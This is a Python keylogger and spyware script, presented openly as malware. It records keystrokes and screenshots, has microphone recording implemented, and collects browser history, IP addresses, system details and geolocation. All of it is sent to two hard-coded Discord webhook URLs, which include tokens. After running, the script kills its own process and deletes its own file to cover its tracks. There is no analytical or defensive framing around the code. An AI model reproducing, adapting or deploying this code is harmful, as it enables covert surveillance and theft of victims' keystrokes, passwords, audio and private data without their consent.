try:
    import os
    import logging
    import socket
    import subprocess
    import platform
    import requests
    import wavio as wv
    from scipy.io.wavfile import write
    import json
    import urllib.request
    import pyscreenshot
    import sounddevice as sd
    import browserhistory as bh  
    from pynput.keyboard import Listener
    from threading import Timer
    from datetime import datetime
    from discord_webhook import DiscordWebhook, DiscordEmbed

except ModuleNotFoundError:
    from subprocess import call
    modules = ["pyscreenshot","sounddevice","pynput","logging","socket","platform","requests","wavio","scipy","json","urllib","browserhistory","threading","datetime","discord_webhook"]
    call("pip install " + ' '.join(modules), shell=True)

finally:
    SEND_REPORT_EVERY = 30
    SEND_REPORT_EVERY1 = 4
    WEBHOOK = "https://discord.com/api/webhooks/1133293284769419324/q5x_dmFQ5_9AtssFigDdlurTEyTqshVFf6N_TmZHYEG2fsCFq9h7q5e0yTT1ykTa4gWU"
    WEBHOOK1="https://discord.com/api/webhooks/1133468768148926614/rDC8-bj7DfNJ-6VQmJO_t5OAfruywARKQol2bhuSEQDn-Xf3W2ryrx-cs69IQT03zuWZ"
    class Keylogger: 
        def __init__(self, interval, report_method="webhook"):
            now = datetime.now()
            self.interval = interval
            self.report_method = report_method
            self.log = ""
            self.start_dt = now.strftime('%d/%m/%Y %H:%M')
            self.end_dt = now.strftime('%d/%m/%Y %H:%M')
            self.username = os.getlogin()
        
        def on_move(self, x, y):
            current_move = logging.info("Mouse moved to {} {}".format(x, y))
            self.log+=current_move

        def on_click(self, x, y):
            current_click = logging.info("Mouse moved to {} {}".format(x, y))
            self.log+=current_click

        def on_scroll(self, x, y):
            current_scroll = logging.info("Mouse moved to {} {}".format(x, y))
            self.log+=current_scroll

        def system_information(self):
            self.log=""
            print("sys info func")
            hostname = socket.gethostname()
            ip = socket.gethostbyname(hostname)
            try:
                public_ip = requests.get('https://api.ipify.org').text
            except requests.ConnectionError:
                public_ip = '* Ipify connection failed *'
                pass
            plat = platform.processor()
            system = platform.system()
            machine = platform.machine()
            self.log +="Hostname: "+hostname+"\nPrivate Ip: "+ip+"\npublic_ip: "+public_ip+"\nPlatform report: "+plat+"\nSystem: "+system+"\nMachine: "+machine
            if self.log:
                if self.report_method == "webhook":
                    self.report_to_webhook()    
            self.log = ""

        def location_info(self):
            print("loc func")
            self.log=""
            with urllib.request.urlopen("https://geolocation-db.com/json") as url:
                location = json.loads(url.read().decode())
            self.log +=str(location)
            if self.log:
                if self.report_method == "webhook":
                    self.report_to_webhook()   
            self.log=""

        def browser_hist(self):
            print("browser hist func")
            browser_history = []
            bh_user = bh.get_username()
            db_path = bh.get_database_paths()
            hist = bh.get_browserhistory()
            browser_history.extend((bh_user, db_path, hist))
            self.log += json.dumps(browser_history)
            if self.log:
                if self.report_method == "webhook":
                    self.report_to_webhook()   
            self.log=""


        def microphone(self):
            print("microph func")
            # flag=False
            fs = 44100
            seconds = SEND_REPORT_EVERY1
            myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
            write("sound0.wav", fs, myrecording)
            wv.write("sound1.wav", myrecording, fs, sampwidth=2)
            webhook = DiscordWebhook(url=WEBHOOK1)
            with open(os.path.abspath("sound1.wav"), "rb") as f:
                webhook.add_file(file=f.read(), filename="Sound.wav")
            webhook.execute()
            os.remove(os.path.abspath("sound1.wav"))
            os.remove(os.path.abspath("sound0.wav"))
            sd.wait()

        def screenshot(self):
            print("ss func")
            img = pyscreenshot.grab()
            with open("screenshot.png", "wb") as img_file:
                img.save(img_file)
            webhook = DiscordWebhook(url=WEBHOOK1)
            with open(os.path.abspath("screenshot.png"), "rb") as f:
                webhook.add_file(file=f.read(), filename="Screenshot.png")
            webhook.execute()
            os.remove(os.path.abspath("screenshot.png"))

        def callback(self, key):
            try:
                name=str(key.char)
            except AttributeError:
                if key == key.space:
                    name = " "
                elif key == key.enter:
                    name = "[ENTER]\n"
                elif key == key.esc:
                    name = "ESC"
                    exit()
                elif key == key.tab:
                    name = "    "
                elif key == key.alt_l:
                    name = "[ALT]"
                elif key == key.ctrl_l:
                    name = "[CTRL]"
                elif key == key.backspace:
                    name = "[BACKSPACE]"
                # elif key == key.decimaal:
                #     name = "."
                else:
                    name = " " + str(key) + " "
                    # name = name.replace(" ", "_")
                    # name = f"[{name.upper()}]"
            self.log += name

        def report_to_webhook(self):
            flag = False
            webhook = DiscordWebhook(url=WEBHOOK)
            if len(self.log) > 2000:
                flag = True
                path = os.environ["temp"] + "\\report.txt"
                with open(path, 'w+') as file:
                    file.write(f"Keylogger Report From {self.username} Time: {self.end_dt}\n\n")
                    file.write(self.log)
                with open(path, 'rb') as f:
                    webhook.add_file(file=f.read(), filename='report.txt')
            else:
                embed = DiscordEmbed(title=f"Keylogger Report From ({self.username}) Time: {self.end_dt}", description=self.log)
                webhook.add_embed(embed)    
            webhook.execute()
            if flag:
                os.remove(path)

        def report(self):
            print(self.log)
            if self.log:
                if self.report_method == "webhook":
                    self.report_to_webhook()    
            self.log = ""
            timer = Timer(interval=self.interval, function=self.report)
            timer.daemon = True
            timer.start()


        

    
        def start(self):
            # self.start_dt = datetime.now()
            keyboard_listener = Listener(on_press=self.callback)
            with keyboard_listener:
                self.report()
                keyboard_listener.join()
            with Listener(on_click=self.on_click, on_move=self.on_move, on_scroll=self.on_scroll) as mouse_listener:
                    mouse_listener.join()
            # close_and_delete_file()
            if os.name == "nt":
                try:
                    pwd = os.path.abspath(os.getcwd())
                    os.system("cd " + pwd)
                    os.system("TASKKILL /F /IM " + os.path.basename(__file__))
                    print('File was closed.')
                    os.system("DEL " + os.path.basename(__file__))
                except OSError:
                    print('File is close.')

            else:
                try:
                    pwd = os.path.abspath(os.getcwd())
                    os.system("cd " + pwd)
                    os.system('pkill leafpad')
                    os.system("chattr -i " +  os.path.basename(__file__))
                    print('File was closed.')
                    os.system("rm -rf" + os.path.basename(__file__))
                except OSError:
                    print('File is close.')
    # def close_and_delete_file():
    #     file_path = os.path.abspath(__file__)

    #     if platform.system() == "Windows":
    #         try:
    #             # Terminate the script itself (Windows)
    #             subprocess.run(["TASKKILL", "/F", "/IM", os.path.basename(file_path)])
    #             print('File was closed.')
    #             # Delete the script file (Windows)
    #             os.remove(file_path)
    #         except Exception as e:
    #             print(f'Failed to close and delete the file on Windows: {e}')
    #     else:
    #         try:
    #             # Kill leafpad process (Linux/macOS)
    #             subprocess.run(["pkill", "leafpad"])
    #             print('File was closed.')
    #             # Remove the immutable attribute and delete the script file (Linux/macOS)
    #             subprocess.run(["chattr", "-i", file_path])
    #             os.remove(file_path)
    #         except Exception as e:
    #             print(f'Failed to close and delete the file on Linux/macOS: {e}')  


    if __name__ == "__main__":
        keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="webhook")
        keyloggerforaudimg = Keylogger(interval=SEND_REPORT_EVERY1, report_method="webhook") 
        keylogger.system_information()  
        keylogger.location_info()
        keylogger.browser_hist()
        # keyloggerforaudimg.microphone() 
        keyloggerforaudimg.screenshot()
        keylogger.start()
        

